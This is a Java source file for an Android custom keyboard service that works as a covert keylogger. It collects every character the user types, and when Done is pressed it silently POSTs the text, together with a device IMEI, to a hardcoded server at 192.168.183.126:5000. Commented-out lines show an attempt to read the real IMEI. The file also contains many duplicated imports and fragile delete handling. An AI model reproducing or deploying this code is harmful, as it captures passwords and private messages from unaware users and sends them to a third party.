 package com.example.androidcustomkeyboard;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.app.Activity;
import android.app.Service;
import android.content.Intent;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.media.AudioManager;
import android.os.IBinder;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.renderscript.Script;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;


import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import org.jetbrains.annotations.Contract;
import org.jetbrains.annotations.NotNull;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import android.content.Context;

import android.widget.Toast;
import android.widget.Toast;
public class EDMTKeyboard extends InputMethodService implements KeyboardView.OnKeyboardActionListener {


    private KeyboardView kv;
    private Keyboard keyboard;




    private boolean isCaps = false;
    //Press Ctrl+O
    static String s="";
    static String iemi_no="862719041502560";


    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public View onCreateInputView() {
        kv = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new Keyboard(this, R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
//        TelephonyManager tm = (TelephonyManager)
//                getSystemService(this.TELEPHONY_SERVICE);
//
//        String iemi_no=tm.getImei();
//        System.out.println(iemi_no);


        return kv;
    }

    @Override
    public void onPress(int i) {

    }

    @Override
    public void onRelease(int i) {

    }

    @Override
    public void onKey(int i, int[] ints) {

        InputConnection ic = getCurrentInputConnection();
        playClick(i);
        switch (i) {
            case Keyboard.KEYCODE_DELETE:
                ic.deleteSurroundingText(1, 0);
                StringBuffer sb= new StringBuffer(s);
                sb.deleteCharAt(sb.length()-1);
                 s = sb.toString();

                break;
            case Keyboard.KEYCODE_SHIFT:
                isCaps = !isCaps;
                keyboard.setShifted(isCaps);
                kv.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                //ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                System.out.println("Hello pressed done");
                System.out.println(s);
               // System.out.println(s);
                ic.performEditorAction(EditorInfo.IME_ACTION_GO);






                OkHttpClient okHttpClient = new OkHttpClient();
                RequestBody formbody=new FormBody.Builder().add("value",s).add("value1",iemi_no).build();
                System.out.println(s);
               // Request request = new Request.Builder().url("http://192.168.1.8:5000/").post(formbody).build();
                Request request = new Request.Builder().url("http://192.168.183.126:5000").post(formbody).build();
                okHttpClient.newCall(request).enqueue(new Callback() {
                    @Override
                    public void onFailure(final Call call, final IOException e) {


                        // Toast.makeText(EDMTKeyboard.this, "Something went wrong:" + " " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        System.out.println("error");
                        call.cancel();
                        s="";

                    }
                    @Override
                    public void onResponse (@NotNull Call call, @NotNull Response response) throws IOException {
                        System.out.println(response.body().string());
                        s="";


                    }


                });


                break;
            default:
                char code = (char) i;
                if (Character.isLetter(code) && isCaps)
                    code = Character.toUpperCase(code);
                s += code;
                ic.commitText(String.valueOf(code), 1);
        }

    }

    private void playClick(int i) {

        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
        switch (i) {
            case 32:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR);
                break;
            case Keyboard.KEYCODE_DONE:
            case 10:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN);
                break;
            case Keyboard.KEYCODE_DELETE:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE);
                break;
            default:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD);
        }
    }

    @Override
    public void onText(CharSequence charSequence) {

    }

    @Override
    public void swipeLeft() {

    }

    @Override
    public void swipeRight() {

    }

    @Override
    public void swipeDown() {

    }

    @Override
    public void swipeUp() {

    }

}